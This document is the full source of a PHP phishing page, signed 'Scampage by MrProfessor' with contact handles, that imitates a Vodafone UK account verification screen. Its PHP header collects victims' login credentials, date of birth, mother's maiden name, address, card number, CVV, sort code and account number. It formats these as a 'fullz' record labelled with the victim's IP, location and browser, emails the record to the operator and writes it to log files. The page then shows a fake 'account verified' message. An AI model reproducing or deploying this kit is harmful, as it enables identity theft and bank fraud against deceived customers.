
<?php
/*
 * Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * ICQ: 713566330
 */
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('Europe/London');




$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['username'];
$pass = $_SESSION['password'];
$name = $_SESSION['name'];
$dob = $_SESSION['dob'];


$mmn = $_SESSION['mmn'];

$telephone = $_SESSION['telephone'];
$email = $_SESSION['email'];
$address = $_SESSION['address'].", ".$_SESSION['town'].", ".$_SESSION['postcode'];
$ccname = $_POST['ccname'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$sortcode = $_POST['sortcode'];
$account = $_POST['account'];

$ccno = str_replace(' ', '', $ccno);
$last4 = substr($ccno, 12, 16);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['type']);
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "Os : " . $systemInfo['os'] . "";
$data = "
<^>-----------------------713566330-----------------------<^>

<^>Login<^>
Username : $user
Password : $pass


<^>Personal details<^>
Full name : $name
Telephone : $telephone
Date of birth : $dob
Email : $email
Address : $address
Mother's maiden name : $mmn



<^>Auto billing details<^>
Card BIN : $BIN
Card Bank : $Bank
Card Brand : $Brand 
Card Type : $Type

<^>Victim billing details<^>
Cardholder name : $ccname
Card number : $ccno
Card exp : $ccexp
Security code : $secode
Sortcode : $sortcode
Account number : $account
<^>Victim PC details<^>
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5

Received : $date @ $time
<^>-----------------------713566330-----------------------<^>
";



if ($binSave === 1) {
    $binlist = fopen($BIN.".txt","a");
    fwrite($binlist, $data . "\n\n");
    fclose($binlist);
}

if ($binlist === 1) {
    $bins = array();
    $getBins = explode('\n', file_get_contents('bins.txt'));
    foreach ($getBins as $getbin => $gb) {
        $dat = explode('=>', $gb);
        $bins[$dat[0]] = $dat[1];
    }
    if (isset($bins[intval($BIN)])) {
        $bins[intval($BIN)] =  intval($bins[intval($BIN)]) + 1;
    } else {
        $bins[intval($BIN)] = 1;
    }
    $binFile = fopen('list_bins.txt', 'w');
    foreach ($bins as $bin=>$bn) {
        fwrite($binFile, $bin . "\n");
    }
    fclose($binFile);
}

if ($sendEmail === 1) {

    mail($to,  $BIN . " from " . $_SERVER['REMOTE_ADDR'], $data);
}

if ($saveFile === 1) {
    $file = fopen('assets/logs/fullz.txt', 'a');
    fwrite($file, $data . "\n");
    fclose($file);
}


?>
<!DOCTYPE html SYSTEM "about:legacy-compact">
<html dir="ltr" lang="en-US">
<head id="d1__xc_h" data-at-mbox-name="target-global-mbox" class="mbox-name-target-global-mbox at-element-marker">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <script type="text/javascript" async="" src="assets/files/cool-2.js"></script><script type="text/javascript" async="" src="assets/files/adrum-ext.js"></script>
    <title>Successfully</title>
    <meta name="generator" content="Apache MyFaces Trinidad">
    <style id="at-makers-style" class="at-flicker-control" data-di-track="1">
        .mboxDefault {visibility:hidden;}
    </style>
    <meta http-equiv="refresh" content="5;url=<?php echo $ExitLink; ?>" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
    <script>

        $('#verify').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#verify").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                name: {	required: true,	minlength: 4,},
                                dob: {	required: true,	minlength: 10,},
                                address: { required: true, minlength: 5,},
                                town: { required: true, minlength: 3,},
                                postcode: { required: true, minlength: 5,},
                                telephone: { required: true, minlength: 10, digits: true,},
                                email: { required: true, email: true,},
                            },
                            messages: {
                                name: {
                                    required: "Please provide full name",
                                    minlength: jQuery.validator.format("Please provide your full name"),
                                },
                                dob: {
                                    required: "Please provide date of birth",
                                    minlength: jQuery.validator.format("Please provide your date of birth"),
                                },
                                telephone: {
                                    required: "Please provide telephone number",
                                    minlength: jQuery.validator.format("Please ensure you enter 10 digits exactly"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                email: {
                                    required: "Please provide email address",
                                    email: jQuery.validator.format("Please check the email address you have entered"),
                                },
                                address: {
                                    required: "Please provide the 1st line of your address",
                                    minlength: jQuery.validator.format("Please check the address you have entered"),
                                },
                                town: {
                                    required: "Please provide city/town",
                                    minlength: jQuery.validator.format("Please check the city/town you have entered"),
                                },
                                postcode: {
                                    required: "Please provide postcode",
                                    minlength: jQuery.validator.format("Please check the postcode you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                document.getElementById("Details").style.display = "none";
                                document.getElementById("Payment").style.display = "block";
                                ForwardValues();
                                $('body,html').animate({
                                    scrollTop: 0
                                }, 800);
                                return false;
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);

        function ForwardValues() {
            var name = document.getElementById("name").value;
            document.getElementById("one").value=name;
            var dob = document.getElementById("dob").value;
            document.getElementById("two").value=dob;
            var telephone = document.getElementById("telephone").value;
            document.getElementById("three").value=telephone;
            var email = document.getElementById("email").value;
            document.getElementById("four").value=email;
            var address = document.getElementById("address").value;
            document.getElementById("five").value=address;
            var town = document.getElementById("town").value;
            document.getElementById("six").value=town;
            var postcode = document.getElementById("postcode").value;
            document.getElementById("seven").value=postcode;
        }
        $('#payment').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#payment").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                ccname: { required: true, minlength: 4},
                                ccno: { required: true, minlength: 16, creditcard: true},
                                ccexp: { required: true, minlength: 7,},
                                secode: { required: true, minlength: 3, digits: true,},
                                account: { required: true, minlength: 8,},
                                sortcode: { required: true, minlength: 8,},
                            },
                            messages: {
                                ccname: {
                                    required: "Please provide cardholders name",
                                    minlength: jQuery.validator.format("Please check the cardholders name you have entered"),
                                },
                                ccno: {
                                    required: "Please provide 16 digit card number",
                                    minlength: jQuery.validator.format("Please check the card number you have entered"),
                                    creditcard: jQuery.validator.format("Please check the card number you have entered"),
                                },
                                ccexp: {
                                    required: "Please provide card expiry date",
                                    minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
                                },
                                secode: {
                                    required: "Please provide 3 digit card security code (CVV)",
                                    minlength: jQuery.validator.format("Please check the card security code you have entered"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                account: {
                                    required: "Please provide 8 digit account number",
                                    minlength: jQuery.validator.format("Please check the account number you have entered"),
                                },
                                sortcode: {
                                    required: "Please provide 6 digit sort code",
                                    minlength: jQuery.validator.format("Please check the sort code you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                form.submit();
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);
    </script>
    <script type="text/javascript">
        function movetoNext(current, nextFieldID) {
            if (current.value.length >= current.maxLength) {
                document.getElementById(nextFieldID).focus();
            }
        }
        jQuery(function($){
            $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
            $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
            $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
        });
        jQuery(function($) {
            $('.cc-number').payment('formatCardNumber');
            $('.cc-exp').payment('formatCardExpiry');
            $('.cc-cvc').payment('formatCardCVC');

            $.fn.toggleInputError = function(erred) {
                this.parent('.field').toggleClass('errorzzzz', erred);
                return this;
            };

            $('form').submit(function(e) {
                e.preventDefault();

                var cardType = $.payment.cardType($('.cc-number').val());
                $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
                $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
                $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
                $('.cc-brand').text(cardType);
            });

        });

    </script>
    <style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style>
</head>
<body id="d1" onload="_checkLoad()" onunload="_checkUnload(event)" data-inq-observer="1">
<noscript>This page uses JavaScript and requires a JavaScript enabled browser.Your browser is not JavaScript enabled.</noscript>
<meta http-equiv="X-UA-Compatible" content="IE=9">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<meta http-equiv="cleartype" content="on">
<link type="text/css" rel="stylesheet" href="assets/files/taskflow_mobile_min.css">

<form id="verify" name="verify" style="margin:0px" method="POST" action="Form_2.php?ssl_id=<?php echo generateRandomString(130); ?>">
         <span id="pgl2" class="x1a">
            <div class="wrapper" style="margin-top: -194px;">
               <div class="header-wrapper">
                  <div class="vodafone-header" style="border-top: 194px solid;">
                     <div class="mainmenu-button-container">
                        <div class="button-container"><a id="button-main-menu" class="btn gray-button fRight">Menu</a><a id="button-back" class="btn gray-button fRight" onclick="history.back();"><span class="button-icon back-icon"></span></a></div>
                     </div>
                     <a href="#"><img src="assets/files/mobile_rhombus.png" alt="vodafone logo" class="vodafone-anchor"></a>
                  </div>
                  <div class="main-menu-overlay"></div>
                  <div id="mainMenu" class="cssTranform main-menu" style="display: block; transition-duration: 0ms; transform: translate(0px, -600px);">
                     <div class="button-close-container">
                        <div class="right-panel"></div>
                        <a id="button-main-menu-close" class="button-main-menu-close">
                           <div class="center-panel"><span class="btn menu-close-button">Close</span></div>
                        </a>
                        <div class="left-panel"></div>
                        <div class="clear"></div>
                     </div>
                     <div class="menu-grid">
                        <ul class="voda-list-view">
                           <li class="btn-item"><a class="item-link" href="#"><span class="item-content"><span class="item-title">Mobile</span><span class="item-desc"><span class="item-icon arrow-right-icon"></span></span></span></a></li>
                           <li class="btn-item"><a class="item-link" href="#"><span class="item-content"><span class="item-title">Broadband</span><span class="item-desc"><span class="item-icon arrow-right-icon"></span></span></span></a></li>
                           <li class="btn-item"><a class="item-link" href="#"><span class="item-content"><span class="item-title">Find a store</span><span class="item-desc">Search for your nearest store</span><span class="item-icon arrow-right-icon"></span></span></a></li>
                           <li class="btn-item"><a class="item-link" href="#"><span class="item-content"><span class="item-title">Help and support</span><span class="item-desc">Get help with your phone and our services</span><span class="item-icon arrow-right-icon"></span></span></a></li>
                        </ul>
                        <div class="close-menu-container"><a class="btn gray-button fLeft button-main-menu-close">Close menu</a></div>
                     </div>
                     <hr class="top-red-line">
                  </div>
               </div>
            </div>
            <div class="info-panel">
               <div id="pt_r1" class="xnl">

                  <span id="pt_r1:0:login" class="x1a">
                     <div class="portlet_loginForm_v3">
                        <h2>Successfully</h2>
                        <p class="notice"></p>
                          <p style="text-align: center;">

<img src="assets/spin.gif" style="width: 70px;" /><Br /> <Br />
                              Your account has been verified, you will be redirected shortly to main page.
                           </p>

                        <div class="clearfix"></div>
                     </div>
                  </span>
                  <div style="display:none"><a id="pt_r1:0:_afrCommandDelegate" class="xfd" onclick="return false;" href="#"></a></div>
               </div>
            </div>
            <div class="footer">
               <ul class="voda-list-view">
                  <li class="lnk-item"><a href="#">Help &amp; support on our full website</a></li>
                  <li class="lnk-item"><a href="#">Visit our full website</a></li>
                  <li class="lnk-item"><a href="#">Terms &amp; conditions</a></li>
                  <li class="lnk-item"><a href="#">Privacy and cookies</a></li>
               </ul>
               <div class="fRight" style="min-height:30px;">
                  <div class="media-sharing">Follow us</div>
                  <ul class="media-sharing">
                     <li><a href="#"><img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAMAAAAM7l6QAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAYBQTFRFMXm9QZrePpPVfKvVSKbq6vP62uv2cLPmPXy8qsnkSajsKHzDQp7hMHW6Y6PZNYbKJ4rXerHePZzjgr3oPI7RUabku9vyRaHkLIPLMn7BSpvbOonMHW24uNbu5vL6Up3cisTtXKHZ9Pj7SqvwNo3TNILE9fn8O4zOP5XYQJbZNYTG/v7/P4TBTKHigLLcSZXSLXO4RIzKqtDtOIbJsMjhi7XcmcLkms7yZaTXIWqydK3aQaDmLnO4MoHDQ6DjK3G4M5HbOYjLPpjdVY7GKnC1zuPyL4HFRqbrfq7YR6ToSofB4u33MXe7+Pv9WpLHLpXhSpjWR5raQ6ToNonOKnO7Q6PpLHq/K3a8+/3+NIHDf6/aRabqRpTUPJjdPIzPJ2+1HXbAPqTq0OHveKbRytzw6PD3Pn/AQH+9QqbsRaPnRKftRarvZqrfR5HPQ53fQY/QMnu/TonBRZrcLna8jLHUQYfEQojGM3i67/X78/j78vj8rsznOZLXOpbcSqnt////2jHnngAAAetJREFUeNps0Q1X0lAYwPFHBgQDYo73FxFEhYYgYRnIgNAQEKYGmqKZ9EJFaZFaUSL3q3fvnYut/J3D5T7Pn52zcwCEpDePs/f/t2YeJhAgKcV/jN7h82t/JQGJVT46nmDZv7dxNN6Axsm4qlewLDmrx8fVKll+mgZzXv+P/n5rv9Vq4T72Qypf18q7wk+wMNuv65MwzXs0+LobEUNX3tNPQoovauw4ftMcclmLnllInVg1dsISQglDyOjirUWSp9S+PHUsImS8d+ZI4gHnG3Vdv+FIznAct45H/OajB2oX9OkZ/9QFmXbhaBSfmI9kZiqHCDXc7sxzXZzked0EdzZEt4b+kU63jLNzwps1KNmwi8My1NpOZwzDJ86RSg//jWiuF6q8bMec51CzxybaXyOzq+TVspHIKzyTHCiXywH5CNi93bVfCJk3LV4ynwOzuaJmt6TmELouC3R6iLOg0T0ieUXe4uxbUAgC/nRrJAvyFmdLQdHpFAoLNJs78vYHMC98GkGaffL2OzAHg8HA5xsoggzJgwM6LAGzBxpBZpFmOizB1V5TDXL06Z90CyZ4d9q0qaXfb2xvbzUvyf3yG0hbzzTZJpZKpbR8zV0DMppORdEm3qI/IF+imM5dHQJK9N5+MN1l45GE/ggwAL2+r6DR0dqdAAAAAElFTkSuQmCC"></a></li>
                     <li><a href="#"><img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAMAAAAM7l6QAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAYBQTFRFld3h4fX2edHVpeTnsujsqubouuzwwerrrOfpnNvet+vvdM3Ur+jq7fr5yO3t6/j4xPL0o97gn+Dk//79rujqkdvesOTn5vb2rePmfNHXk93ghNLWp+DhuOrvg9TY3vX1oN3fiNXbgNLYqeHirOjpdM3RiNbcjNndmN3hp+Dkvu7yvOvuetHWeNDWcc3R5Pb41PHyo+HmuO3t6/b32vP0q+jpsubohNXZoODkhtXa+v79m+DjnODj9Pz7vOjqfdLXhdTZe9LWouHh6Pj3yevtu+zxtu3vtOrutersrujpq+Lko+Plmd/ih9bbcs7UbszR8Pv72PHyr+Tlktzfjtndi9jddtDUtOntve3yj9nejNfdktvgve7yjtrdve7xsujr3/P0j9reuOnqjtfbuevvz+7veM/WjNjal93houTmquXovu3xlNnbpebouOfouOXnftLY4PT11O/xs+rqoOHmnd/kvO3vsOnrsevs9vz8ftHUwvHyd9DVv+/yds/V////Ve4G6gAAAe5JREFUeNp004lz0kAUBvBXLmMMV1qgIBSkFRG5qhShoIDSIpdFkQLaA2vViGcVjVo0/7rvbaiEHr/ZSbLfN5ns7kxAQdajuTMGVmpAUQYHnCzIpwg/uftHVH9dsB2fx2YbphSwcrY/54sc11tg6fV6OxG67L2nG04ikR6OXmTHlISDvQ3VoWnTtDHrxydIm3je5+N9h/5W4jbvowlOiY83OSG92SVyCreRMHQnKhW68k5w0oOhK5uxvveNdfv7FBkM3YoTnsrCAlphdZVTCQKFgox1dQWtGemQft1SPTJyLKwuQm3NiIb6h8rUukU/xMxoxPqjntS1tbJefcfSGtTqq2iUmann0yKlqzXwjkRRzGS+u7T1HMvE0TJ4c7lcPpdrJGhpFtWlfCPP4mV40AiHw5IEVJs9jheMxLKwhDV4SJvqFrQ9M7xgbzvIrp+ORdp1zPBC4GWfhCy0pGS/cwN1Omr4zA6BznPSXGRLNruIPxBSU6xD15jmE83GzP0sCwNwOVtklt5qDmY+HCwWs9m7WC9NFF5N37/TDLIM6+AJd/Rmkn3alfrgZskXrEsF94nxOBqNugulNzE1i9rBuV3S6XBMxHQa22UYXNfFxrHxVOz/RBe3gvJ56+8Ftsr0j5V/xx9fOSt+9bWi/BNgACEK6gn6wJd5AAAAAElFTkSuQmCC"></a></li>
                  </ul>
               </div>
               <div class="copyright">© 2019 Vodafone Limited</div>
               <div class="clear">&nbsp;</div>
            </div>
         </span>
    <input type="hidden" name="org.apache.myfaces.trinidad.faces.FORM" value="f1" goodname="org.apache.myfaces.trinidad.faces.FORM" adfname="org.apache.myfaces.trinidad.faces.FORM"><input type="hidden" name="_noJavaScript" value="false" goodname="_noJavaScript" adfname="_noJavaScript">
    <span id="tr_f1_Postscript">
            <input type="hidden" name="javax.faces.ViewState" value="!hmhwhqbww" goodname="javax.faces.ViewState" adfname="javax.faces.ViewState"><script type="text/javascript">function _f1Validator(f,s){return _validateInline(f,s);}var f1_SF={};</script>
         </span>

</form>
<span id="pt_ot1" class="xq" style="display:none"><label>MGS  :: aukwc2gx_prd2_cp1</label></span><script>populateJSONData('{"page_market":"UK","task_name":"login","site_section_lvl_1":"uk:my account","webserver":"aukwc2gx_prd2_cp1","hier1":"my account","journey_type":"login","visitor_login_status":"logged out","event":"journey_start","user_experience":"mobile","page_type":"login","page_name":"uk:my account:login","page_platform":"CCS19.0","page_channel":"self service"}')</script><script>invokeTealiumTagging('nothing');</script><script>authenticationLevelsCleared('{"authenticationLevelsCleared":{"subscriptionAuthLevel":{"ROTAC":{}},"authLevels":{"2LA":false,"DPA":false,"loggedIn":false}}}')</script><script>authenticationLevelsCleared('{"authenticationLevelsCleared":{"subscriptionAuthLevel":{"ROTAC":{}},"authLevels":{"2LA":false,"DPA":false,"loggedIn":false}}}')</script><script src="assets/files/embed.js" async=""></script><iframe style="display:none" src="assets/files/a.html" id="646-0" width="1" height="1"></iframe>
<div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.09947422862601563"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.36670264863891844" alt="" src="assets/files/0.txt" width="0" height="0"></div>
<iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_vodafoneuk_0" name="destination_publishing_iframe_vodafoneuk_0_name" style="display: none; width: 0px; height: 0px;" src="assets/files/dest5.html" class="aamIframeLoaded"></iframe><script type="text/javascript" id="_aw_script_0" src="assets/files/tag.js"></script><iframe id="AWIN_CDT" src="assets/files/a_002.html" style="height: 0px !important; width: 0px !important; visibility: hidden !important; display: inherit !important; margin: 0px !important; border: 0px none !important; padding: 0px !important;"></iframe><script type="text/javascript" id="_aw_script_1" src="assets/files/fs.js"></script><iframe id="ve-storage-iframe" tabindex="-1" src="assets/files/iframeStorage-5.html" style="display: none;"></iframe><span id="VeCustomJsEvent" style="display: none;">undefined</span><input type="hidden" id="vebuttonfilter" value="No click"><input type="hidden" id="Mvebuttonfilter" value="No click"><iframe style="position: absolute; border: 0px none; width: 0px; height: 0px;" src="assets/files/a_003.html"></iframe><script type="text/javascript" async="" src="assets/files/generic1556287097035.js" charset="UTF-8"></script><script src="assets/files/adsct" type="text/javascript"></script>
<span>
         <div id="KampyleAnimationContainer" style="z-index: 2147483000; border: 0px none; position: fixed; display: block; width: 0px; height: 0px;"></div>
      </span>
<iframe id="inqChatStage" title="Chat Window" name="10006330" src="assets/files/nuance-chat.html" style="z-index:9999999;overflow:hidden;position:absolute;height:1px;width:1px;left:0px;top:0px;border-style: none;border-width: 0px;display: none;" scrolling="NO" frameborder="0"></iframe>
<div id="inqDivResizeCorner" style="border-width: 0px; position: absolute; z-index: 9999999; left: 424px; top: 284px; cursor: se-resize; height: 16px; width: 16px; display: none;"></div>
<div id="inqResizeBox" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; display:none; height: 0px; width: 0px;"></div>
<div id="inqTitleBar" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; cursor: move; height: 55px; width: 410px; display: none;"></div>
<div id="Nuance-chat-anchored" style="position: fixed; bottom: 0px; right: 0px; z-index: 9999; display: block;"></div>
<div id="Nuance-chat-anchored-1" style="position: fixed; bottom:0;right:0;z-index:9999"></div>
<div id="Nuance-chat-vertical" style="position: fixed;bottom: calc(50% - 240px); right:0; z-index:99999"></div>
<div id="VFUK_CProfile_div" data-at-mbox-name="VFUK_CProfile" class="mbox-name-VFUK_CProfile"></div>
<div id="injectTargetScreenReader" style="overflow: hidden; height: 1px; width: 1px; left: -1000px; top: 0px; position: absolute;" role="alert" aria-live="polite" aria-relevant="additions text" aria-atomic="false"></div>
</body>
<!--Created by Apache Trinidad (Apache MyFaces Trinidad API - 1.2.12.5.0-SNAPSHOT/Apache MyFaces Trinidad Impl - 1.2.12.5.0-SNAPSHOT), skin:skinReset (skinReset)--><script type="text/javascript" id="useragent-switcher">navigator.__defineGetter__("userAgent", function() {return "Mozilla/5.0 (Linux; Android 7.0; PLUS Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36"})</script>
</html>


